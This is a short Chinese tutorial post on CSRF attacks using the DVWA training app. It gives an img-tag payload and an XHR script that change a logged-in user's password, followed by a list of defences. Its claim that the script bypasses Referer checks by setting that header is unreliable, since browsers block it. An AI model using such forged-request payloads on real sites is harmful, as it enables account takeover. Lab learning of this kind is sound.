---
title: CSRF跨站请求伪造
date: 2024-01-11
tags: [DVWA, CSRF, 漏洞]
---

# CSRF跨站请求伪造

## 什么是CSRF

CSRF（Cross-Site Request Forgery）是一种利用用户已认证的会话来执行非预期操作的攻击方式。

## CSRF攻击原理

1. 用户登录目标网站
2. 服务器设置Session Cookie
3. 攻击者诱导用户访问恶意页面
4. 恶意页面发送伪造请求
5. 服务器认为是合法请求并执行

## DVWA中的CSRF测试

### 低级难度

```html
<!-- 恶意页面 -->
<img src="http://dvwa.local/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
```

### 中级难度

```html
<!-- 需要Referer验证绕过 -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://dvwa.local/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change");
xhr.setRequestHeader("Referer", "http://dvwa.local");
xhr.send();
</script>
```

### 高级难度

需要Token验证，通常需要结合XSS漏洞才能利用。

## CSRF防护措施

1. **Token验证**：每次请求携带随机Token
2. **Referer验证**：检查请求来源
3. **SameSite Cookie**：限制Cookie发送范围
4. **双重提交Cookie**：将Cookie值作为请求参数
5. **验证码**：敏感操作需要验证码

## 总结

CSRF是一种常见的Web漏洞，需要开发者在开发过程中注意防护。